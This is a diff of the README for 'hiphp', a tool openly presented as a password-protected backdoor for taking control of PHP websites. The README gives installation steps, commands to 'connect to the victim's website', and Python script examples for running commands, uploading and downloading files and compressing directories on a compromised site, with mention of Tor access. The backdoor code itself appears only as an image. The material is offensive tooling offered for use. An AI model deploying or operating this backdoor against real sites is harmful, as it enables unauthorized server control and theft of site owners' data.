@@ -30,116 +30,53 @@
 ![GitHub release (latest by date)](https://img.shields.io/github/v/release/yasserbdj96/hiphp)
 ![GitHub commit activity](https://img.shields.io/github/commit-activity/m/yasserbdj96/hiphp)
 [![GitHub license](https://img.shields.io/github/license/yasserbdj96/hiphp)](https://github.com/yasserbdj96/hiphp)
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
 [![Join the chat at https://gitter.im/yasserbdj96/hiphp](https://badges.gitter.im/yasserbdj96/hiphp.svg)](https://gitter.im/yasserbdj96/hiphp?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
 
-
 <br>
-<h2>What is Hiphp?</h2>
+<h2>1- What is Hiphp?</h2>
 <p>The BackDoor of HIPHP allows you to control the websites that are based on PHP using HTTP/HTTPS protocol. It works by sending files, tokens, and commands to the site using port 80's POST/GET method. After placing the HIPHP_HOLE_CODE into any PHP file, it will allow you to access it and perform various activities such as downloading and editing files. It also allows you to connect to tor networks, this BackDoor is a password protected.</p>
 
-<table>
-	<tr>
-		<td>Don't forget to star ⭐ this repository</td>
-	</tr>
-</table>
 
 <br>
-<h2>Share on</h2>
+<h2>2- Table of Contents:</h2>
 
-<table>
-	<tr>
-		<td>
-			<a href="https://www.facebook.com/sharer.php?t=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&u=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md&_rdc=2&_rdr">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/raw/master/public/images/icons/facebook.svg" height="48" width="48" alt="Facebook"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://twitter.com/intent/tweet?text=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/raw/master/public/images/icons/twitter.svg" height="48" width="48" alt="Twitter"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://web.whatsapp.com/send?text=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites. https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/whatsapp.svg" height="48" width="48" alt="WhatsApp"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://t.me/share/url?url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md&text=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/telegram.svg" height="48" width="48" alt="Telegram"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://www.linkedin.com/shareArticle?title=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/linkedin.svg" height="48" width="48" alt="LinkedIn"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://vk.com/share.php?url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/vkontakte.svg" height="48" width="48" alt="Vkontakte"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://www.blogger.com/blog-this.g?n=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&t=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&u=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/blogger.svg" height="48" width="48" alt="Blogger"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://wordpress.com/wp-admin/press-this.php?u=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md&t=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&s=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&i=">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/wordpress.svg" height="48" width="48" alt="Wordpress"/>
-			</a>
-		</td>
-		<td>
-			<a href="mailto:recipient name?cc=cc&bcc=bcc&subject=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&body=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.-https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/gmail.svg" height="48" width="48" alt="Email"/>
-			</a>
-		</td>
-		<td>
-			<a href="https://www.reddit.com/submit?title=hiphp%20-%20free%20and%20open%20source%20project%20for%20create%20a%20BackDoor%20to%20control%20PHP-based%20sites.&url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp%2Fblob%2Fmain%2FREADME.md">
-				<img src="https://github.com/gayanvoice/github-active-users-monitor/blob/master/public/images/icons/reddit.svg" height="48" width="48" alt="Reddit"/>
-			</a>
-		</td>
-	</tr>
-</table>
-
-<br>
-<h2>Table of Contents:</h2>
-
-- [What is Hipip?](#what-is-hiphp)
-- [Table of Contents](#Table-of-Contents)
-- [Demo](#Demo)
-- [How do you use this version of the project?](#How-do-you-use-this-version-of-the-project)
-- [All languages used in this project](#All-languages-used-in-this-project)
-- [Where can you find this project?](#Where-can-you-find-this-project)
-- [Requirements](#Requirements)
-- [Install all Requirements](#Install-all-Requirements)
-- [Supported Distributions](#Supported-Distributions)
-- [Hiphp with Docker](#Hiphp-with-Docker)
-    - [Docker pull build and run](#Docker-pull-build-and-run)
-    - [Docker Hub pull build and run](#Docker-Hub-pull-build-and-run)
-    - [GitHub container registry pull build and run](#GitHub-container-registry-pull-build-and-run)
-- [Installation](#Installation)
-    - [Python Package Installation](#Python-Package-Installation)
-    - [Ubuntu Installation](#Ubuntu-Installation)
-    - [Termux Installation](#Termux-Installation)
-- [Run without installation](#Run-without-installation)
-- [Run with hiphp-desktop](#Run-with-hiphp-desktop)
-- [Run with hiphp-tk](#Run-with-hiphp-tk)
-- [Use As Script](#Use-As-Script)
-    - [Script Usage](#Script-Usage)
-    - [Script Examples](#Script-Examples)
-- [Help for Command Line interface](#help-for-command-Line-interface)
-- [HIPHP_HOLE_CODE Example](#HIPHP_HOLE_CODE-Example)
-- [Screenshots](#Screenshots)
-- [Changelog History](#Changelog-History)
-- [Limitations](#Limitations)
-- [Development By](#Development-By)
-- [License](#License)
-- [Support](#Support)
+- [1- What is Hipip?](#what-is-hiphp)
+- [2- Table of Contents](#Table-of-Contents)
+- [3- Demo](#Demo)
+- [4- How do you use this version of the project?](#How-do-you-use-this-version-of-the-project)
+- [5- All languages used in this project](#All-languages-used-in-this-project)
+- [6- Where can you find this project?](#Where-can-you-find-this-project)
+- [7- Requirements](#Requirements)
+    - [A- used requirements](#used-requirements)
+    - [B- Install all Requirements](#Install-all-Requirements)
+- [8- Supported Distributions](#Supported-Distributions)
+- [9- Hiphp with Docker](#Hiphp-with-Docker)
+    - [A- Docker pull build and run](#Docker-pull-build-and-run)
+    - [B- Docker Hub pull build and run](#Docker-Hub-pull-build-and-run)
+    - [C- GitHub container registry pull build and run](#GitHub-container-registry-pull-build-and-run)
+- [10- Installation](#Installation)
+    - [A- Python Package Installation](#Python-Package-Installation)
+    - [B- Ubuntu Installation](#Ubuntu-Installation)
+    - [C- Termux Installation](#Termux-Installation)
+- [11- Run without installation](#Run-without-installation)
+    - [A- Run with hiphp-cli](#Run-with-hiphp-cli)
+        - [a- Help for hiphp-cli](#help-for-hiphp-cli)
+    - [B- Run with hiphp-desktop](#Run-with-hiphp-desktop)
+    - [C- Run with hiphp-tk](#Run-with-hiphp-tk)
+- [12- Use hiphp As Script](#Use-As-Script)
+    - [A- Script Usage](#Script-Usage)
+    - [B- Script Examples](#Script-Examples)
+- [13- HIPHP_HOLE_CODE Example](#HIPHP_HOLE_CODE-Example)
+- [14- Screenshots](#Screenshots)
+- [15- Changelog History](#Changelog-History)
+- [16- Limitations](#Limitations)
+- [17- Development By](#Development-By)
+- [18- License](#License)
+- [19- Support](#Support)
 
 
 <br>
-<h2>Demo:</h2>
+<h2>3- Demo:</h2>
 <div align="center">
     <!--a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/hiphp_cli.gif">
         <img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/hiphp_cli.gif" alt="hiphp by yasserbdj96">
@@ -147,21 +84,16 @@
     <a href="https://asciinema.org/a/523450" target="_blank"><img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/demo.png" /></a>
 </div>
 
-<!--h2>How hiphp works?</h2>
-<div align="center">
-    <img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/how_hiphp_works.png" alt="hiphp by yasserbdj96">
-</div-->
-
 <br>
-<h2>How do you use this version of the project?</h2>
-[✓] Command line interface CLI.<br>
-[✓] Graphical user interface GUI (beta).<br>
-[✓] Python Module.<br>
+<h2>4- How do you use this version of the project?</h2>
+[✓] Command Line Interface (CLI).<br>
+[✓] Graphical User Interface (GUI).<br>
+[✓] Python Package.<br>
 [✓] Script.<br>
 [✓] Docker Container.
 
 <br>
-<h2>All languages used in this project:</h2>
+<h2>5- All languages used in this project:</h2>
 * Python3<br>
 * PHP<br>
 * Shell (Bash)<br>
@@ -171,49 +103,52 @@
 * HTML
 
 <br>
-<h2>Where can you find this project?</h2>
+<h2>6- Where can you find this project?</h2>
 [✓] <a href="https://pypi.org/project/hiphp">https://pypi.org/project/hiphp/</a><br>
 [✓] <a href="https://hub.docker.com/r/yasserbdj96/hiphp">https://hub.docker.com/r/yasserbdj96/hiphp</a><br>
 [✓] <a href="https://github.com/yasserbdj96/hiphp">https://github.com/yasserbdj96/hiphp</a><br>
 [✓] <a href="https://github.com/yasserbdj96/hiphp/pkgs/container/hiphp">Github Packages</a><br>
-[✓] <a href="https://gitlab.com/yasserbdj96/hiphp">https://gitlab.com/yasserbdj96/hiphp</a>
 
 <br>
-<h2>Requirements:</h2>
+<h2>7- Requirements</h2>
+<h4>A- used requirements:</h4>
 <!--[✓] <a href="https://github.com/yasserbdj96/ashar">ashar</a><br-->
-[✓] <a href="https://github.com/psf/requests">requests</a><br>
-[✓] <a href="https://github.com/yasserbdj96/hexor">hexor</a><br>
-[✓] <a href="https://github.com/yasserbdj96/biglibrary">biglibrary</a><br>
+[✓] <a href="https://pypi.org/project/requests/">requests</a><br>
+[✓] <a href="https://pypi.org/project/hexor/">hexor</a><br>
+[✓] <a href="https://pypi.org/project/biglibrary/">biglibrary</a><br>
 [✓] <a href="">tk</a><br>
-[✓] <a href="https://github.com/ChrisKnott/Eel">eel</a>
+[✓] <a href="https://pypi.org/project/Eel/">eel</a><br>
+[✓] <a href="https://pypi.org/project/readline/">readline</a><br>
+[✓] <a href="https://pypi.org/project/chardet/">chardet</a>
 
 <br>
-<h2>Install all Requirements:</h2>
+<h4>B- Install all Requirements:</h4>
 
 ```bash
 # For Linux:
 ❯ bash install_all_requirements_linux.sh
 
 # For Windows:
-# Do not forget to modify the "config.ini" file or use the following command -->python -c "import sys; open('config.ini', 'w+').write('python_default_path='+sys.executable)"
+# Do not forget to modify the "config.ini" file or use the following command:
+# > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
+# OR Run 'configure-config-file-for-windows.py'.
 ❯ install_all_requirements_win.bat
 ```
 
 <br>
-<h2>Supported Distributions:</h2>
+<h2>8- Supported Distributions:</h2>
 
-| Distribution   | Version Check | Python Test Version | Supported | Installation | Test in Browser    |
-| :------------: | :-----------: | :-----------------: | :-------: | :----------: | :----------------: |
-| Ubuntu         | Last version  | 3.6 --> 3.10        | ✓         | ✓            | chrome, firefox    |
-| Windwos        | Last version  | 3.6 --> 3.10        | ✓         | ✗            | chrome, firefox    |
-| MacOS          | Last version  | 3.6 --> 3.10        | ✓         | ✗            | chrome, firefox    |
-| Android-termux | Last version  | 3.6 --> 3.10        | ✓         | ✓            | ✗                  |
-| Nethunter      | Last version  | 3.6 --> 3.10        | ✓         | ✓            | ✗                  |
+| Distribution   | Version Check | Python Version | Installation | hiphp-cli  | hiphp-desktop | hiphp-tk |
+| :------------: | :-----------: | :------------: | :----------: | :--------: | :-----------: | :------: |
+| Ubuntu         | Last version  | 3.6 --> 3.10   | ✓            |  ✓         | ✓             | ✓        |
+| Windwos        | Last version  | 3.6 --> 3.10   | ✗            |  ✓         | ✓             | ✓        |
+| MacOS          | Last version  | 3.6 --> 3.10   | ✗            |  ✓         | ✓             | ✓        |
+| Android-termux | Last version  | 3.6 --> 3.10   | ✓            |  ✓         | ✗             | ✗        |
+| Nethunter      | Last version  | 3.6 --> 3.10   | ✓            |  ✓         | ✗             | ✓        |
 
 <br>
-<h2>Hiphp with Docker:</h2>
-
-<h4>Docker pull build and run:</h4>
+<h2>9- Hiphp with Docker:</h2>
+<h4>A- Docker pull build and run:</h4>
 
 ```bash
 # Build:
@@ -226,7 +161,7 @@
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t hiphp:latest
 ```
 
-<h4>Docker Hub pull build and run:</h4>
+<h4>B- Docker Hub pull build and run:</h4>
 
 ```bash
 # Pull:
@@ -242,7 +177,7 @@
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t docker.io/yasserbdj96/hiphp:latest
 ```
 
-<h4>GitHub container registry pull build and run:</h4>
+<h4>C- GitHub container registry pull build and run:</h4>
 
 ```bash
 # Pull:
@@ -257,10 +192,9 @@
 # Run as GUI:
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t ghcr.io/yasserbdj96/hiphp:latest
 ```
-
 <br>
-<h2>Installation:</h2>
-<h4>Python Package Installation:</h4>
+<h2>10- Installation:</h2>
+<h4>A- Python Package Installation:</h4>
 
 ```bash
 # Install from pypi:
@@ -278,9 +212,10 @@
 ❯ pip uninstall hiphp
 ```
 
-<h4>Ubuntu Installation:</h4>
+<h4>B- Ubuntu Installation:</h4>
 
 ```bash
+# Dwonload:
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 
 # Go to Installation folder:
@@ -294,21 +229,22 @@
 ❯ bash install.sh -up
 
 # Usage:
-❯ hiphp [OPTION]
-❯ hiphp --help                # hiphp cli help.
-❯ hiphp --geth [KEY] [URL]    # Get the hole Code.
-❯ hiphp [KEY] [URL]           # Connect to the victim's website.
-❯ hiphp --tk                  # Run hiphp as GUI with 'hiphp-tk' script.
-❯ hiphp --dst                 # Run hiphp as GUI with 'hiphp-desktop'.
-❯ hiphp --version             # Get the version number you are working with.
+#      hiphp [OPTION]
+#      hiphp --help                --> hiphp cli help.
+#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
+#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
+#      hiphp --tk                  --> Run hiphp with 'hiphp-tk' (GUI) Mode.
+#      hiphp --dst                 --> Run hiphp with 'hiphp-desktop' (GUI) Mode.
+#      hiphp --version             --> Get the version number you are working with.
 
 # Uninstall:
 ❯ bash install.sh -u
 ```
 
-<h4>Termux Installation:</h4>
+<h4>C- Termux Installation:</h4>
 
 ```bash
+# Dwonload:
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 
 # Go to Installation folder:
@@ -322,23 +258,33 @@
 ❯ bash install.sh -tup
 
 # Usage:
-❯ hiphp [OPTION]
-❯ hiphp --help                # hiphp cli help.
-❯ hiphp --geth [KEY] [URL]    # Get the hole Code.
-❯ hiphp [KEY] [URL]           # Connect to the victim's website.
-❯ hiphp --version             # Get the version number you are working with.
+#      hiphp [OPTION]
+#      hiphp --help                --> hiphp cli help.
+#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
+#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
+#      hiphp --version             --> Get the version number you are working with.
 
 # Uninstall:
 ❯ bash install.sh -tu
 ```
 
 <br>
-<h2>Run without installation:</h2>
+<h2>11- Run without installation:</h2>
+<h4>A- Run with hiphp-cli:</h4>
 
 ```bash
+# Dwonload:
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 ❯ cd hiphp
+
+# install requirements:
 ❯ pip install -r requirements.txt
+❯ pip install -r requirements-linux.txt #for linux os.
+❯ pip install -r requirements-win.txt #for windows os.
+# OR
+❯ bash install_all_requirements_linux.sh #for linux os.
+# OR
+❯ install_all_requirements_win.bat #for windows os.
 
 # default run on any os:
 ❯ python3 run.py <KEY> <URL>
@@ -346,119 +292,16 @@
 # Run with Makefile:
 ❯ make run arg="cli" url="<URL>" key="<KEY>"
 
-# In case you encounter some errors on Windows os:
-# You must enter the installation path of your Python program in the "config.ini" file or use this command -->python -c "import sys; open('config.ini', 'w+').write('python_default_path='+sys.executable)"
+# For Windows:
+# Do not forget to modify the "config.ini" file or use the following command:
+# > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
+# OR Run 'configure-config-file-for-windows.py'.
 ❯ run.bat <KEY> <URL>
 
 ```
 
 <br>
-<h2>Run with hiphp-desktop:</h2>
-
-```bash
-# Run with hiphp-desktop tool:
-❯ git clone https://github.com/yasserbdj96/hiphp.git
-❯ cd hiphp
-❯ pip install -r requirements.txt
-❯ cd hiphp-desktop
-❯ pip install -r requirements-dst.txt
-❯ python3 main.py
-
-# Or if you install it on Ubuntu:
-❯ hiphp --dst
-
-# Run with Makefile:
-❯ make run arg="dst" url="<URL>" key="<KEY>"
-
-# Just on windows:
-# You must enter the installation path of your Python program in the "config.ini" file or use this command -->python -c "import sys; open('config.ini', 'w+').write('python_default_path='+sys.executable)"
-❯ run-hiphp-desktop.bat
-
-```
-
-<br>
-<h2>Run with hiphp-tk:</h2>
-
-```bash
-# run with hiphp-tk tool:
-❯ git clone https://github.com/yasserbdj96/hiphp.git
-❯ cd hiphp
-❯ pip install -r requirements.txt
-❯ cd hiphp-tk
-❯ pip install -r requirements-tk.txt
-❯ python3 main.py
-
-# Or if you install it on Ubuntu:
-❯ hiphp --tk
-#OR
-❯ hiphp --tk <KEY> <URL>
-
-# Run with Makefile:
-❯ make run arg="tk" url="<URL>" key="<KEY>"
-
-# Just on windows:
-# You must enter the installation path of your Python program in the "config.ini" file or use this command -->python -c "import sys; open('config.ini', 'w+').write('python_default_path='+sys.executable)"
-❯ run-hiphp-tk.bat
-
-```
-
-<br>
-<h2>Use As Script:</h2>
-<h3>Script Usage:</h3>
-
-```python
-from hiphp import *
-
-# Connect:
-p1=hiphp(key="<KEY>",url="<URL>")
-```
-
-<h3>Script Examples:</h3>
-
-```python
-#START{
-from hiphp import *
-
-# Connect:
-p1=hiphp(key="123",url="http://127.0.0.1/index.php")#Default: retu=False.
-#p1=hiphp(key="123",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")
-#p1=hiphp(key="123",url="https://google.com/index.php")
-
-# Get the hole Code:
-p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php
-
-# Example:1
-# Command:
-p1.run("echo 'this is a test';")
-
-# Example:2
-# Run code from file:
-p1.run_file("./examples.php")# Run code from file.
-p1.run_file("./examples.php","var1==true","var2==hiii")# Run code from file With the entry of variables.
-
-# Example:3
-# Upload a file:
-p1.upload("./examples.php")# Upload a file to the current directory.
-p1.upload("./examples.php","./upload_path/")# Upload a file to a specific directory.
-
-# Example:4
-# Compress a path:
-p1.compress()# Compress the current directory.
-p1.compress("./example/")# Compress a specific directory.
-
-# Example:5
-# download a file:
-p1.download("example.zip")# download a specific file to the current directory.
-p1.download("example.zip","<OUT_PATH>")# download a specific file to specific directory.
-
-# Example:6
-# Command line interface:
-p1.cli()
-#}END.
-```
-
-<br>
-<h2>Help for Command Line interface:</h2>
+<h5>a- Help for hiphp-cli:</h5>
 
 ```
 hiphp Commands :
@@ -542,79 +385,206 @@ hiphp Commands :
   --version, version                 ─> # Get the version number you are working with.
 ```
 
+<br>
+<h4>B- Run with hiphp-desktop:</h4>
+
+```bash
+# Dwonload:
+❯ git clone https://github.com/yasserbdj96/hiphp.git
+❯ cd hiphp
+
+# install requirements:
+❯ pip install -r requirements.txt
+❯ pip install -r hiphp-desktop/requirements-dst.txt
+❯ pip install -r requirements-linux.txt #for linux os.
+❯ pip install -r requirements-win.txt #for windows os.
+# OR
+❯ bash install_all_requirements_linux.sh #for linux os.
+# OR
+❯ install_all_requirements_win.bat #for windows os.
+
+# run with hiphp-desktop tool:
+❯ cd hiphp-desktop
+❯ python3 main.py
+
+# Run with Makefile:
+❯ make run arg="dst" url="<URL>" key="<KEY>"
+
+# For Linux:
+❯ bash run-hiphp-desktop.sh
+
+# For Windows:
+# Do not forget to modify the "config.ini" file or use the following command:
+# > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
+# OR Run 'configure-config-file-for-windows.py'.
+❯ run-hiphp-desktop.bat
+
+```
 
 <br>
-<h2>HIPHP_HOLE_CODE Example:</h2>
+<h4>C- Run with hiphp-tk:</h4>
+
+```bash
+# Dwonload:
+❯ git clone https://github.com/yasserbdj96/hiphp.git
+❯ cd hiphp
+
+# install requirements:
+❯ pip install -r requirements.txt
+❯ pip install -r hiphp-tk/requirements-tk.txt
+❯ pip install -r requirements-linux.txt #for linux os.
+❯ pip install -r requirements-win.txt #for windows os.
+# OR
+❯ bash install_all_requirements_linux.sh #for linux os.
+# OR
+❯ install_all_requirements_win.bat #for windows os.
+
+# run with hiphp-tk tool:
+❯ cd hiphp-tk
+❯ python3 main.py
+
+# Run with Makefile:
+❯ make run arg="tk" url="<URL>" key="<KEY>"
+
+# For Linux:
+❯ bash run-hiphp-tk.sh
+
+# For Windows:
+# Do not forget to modify the "config.ini" file or use the following command:
+# > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
+# OR Run 'configure-config-file-for-windows.py'.
+❯ run-hiphp-tk.bat
+
+```
+
+<br>
+<h2>12- Use hiphp As Script:</h2>
+<h4>A- Script Usage:</h4>
+
+```python
+from hiphp import *
+
+# Connect:
+p1=hiphp(key="<KEY>",url="<URL>")
+```
+
+<h4>B- Script Examples:</h4>
+
+```python
+#START{
+from hiphp import *
+
+# Connect:
+p1=hiphp(key="123",url="http://127.0.0.1/index.php")#Default: retu=False.
+#p1=hiphp(key="123",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")
+#p1=hiphp(key="123",url="https://google.com/index.php")
+
+# Get the hole Code:
+p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php
+
+# Example:1
+# Command:
+p1.run("echo 'this is a test';")
+
+# Example:2
+# Run code from file:
+p1.run_file("./examples.php")# Run code from file.
+p1.run_file("./examples.php","var1==true","var2==hiii")# Run code from file With the entry of variables.
+
+# Example:3
+# Upload a file:
+p1.upload("./examples.php")# Upload a file to the current directory.
+p1.upload("./examples.php","./upload_path/")# Upload a file to a specific directory.
+
+# Example:4
+# Compress a path:
+p1.compress()# Compress the current directory.
+p1.compress("./example/")# Compress a specific directory.
+
+# Example:5
+# download a file:
+p1.download("example.zip")# download a specific file to the current directory.
+p1.download("example.zip","<OUT_PATH>")# download a specific file to specific directory.
+
+# Example:6
+# Command line interface:
+p1.cli()
+#}END.
+```
+
+<br>
+<h2>13- HIPHP_HOLE_CODE Example:</h2>
 <div align="center">
     <img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/HIPHP_HOLE_CODE.png" alt="hiphp by yasserbdj96">
 </div>
 
 <br>
-<h2>Screenshots:</h2>
+<h2>14- Screenshots:</h2>
 
 <div align="center">
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png" alt="hiphp Social preview">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot0.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot0.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot0.png" alt="hiphp-cli on linux">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot1.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot1.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot1.png" alt="hiphp-cli help">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot2.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot2.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot2.png" alt="hiphp-cli installed on linux">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot3.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot3.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot3.png" alt="hiphp-cli installed on termux">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot4.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot4.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot4.png" alt="hiphp-cli on windows">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot14.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot14.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot14.png" alt="hiphp-cli scanning">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot5.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot5.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot5.png" alt="hhiphp-desktop login">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot6.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot6.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot6.png" alt="hiphp-desktop">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot7.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot7.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot7.png" alt="hiphp-desktop editor">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot8.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot8.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot8.png" alt="hiphp-desktop login dark mode">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot9.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot9.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot9.png" alt="hiphp-desktop dark mode">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot10.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot10.png" alt="hiphp by yasserbdj96">
+        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot10.png" alt="hiphp-desktop editor dark mode">
     </a>
     <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot11.png">
-        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot11.png" alt="hiphp by yasserbdj96">
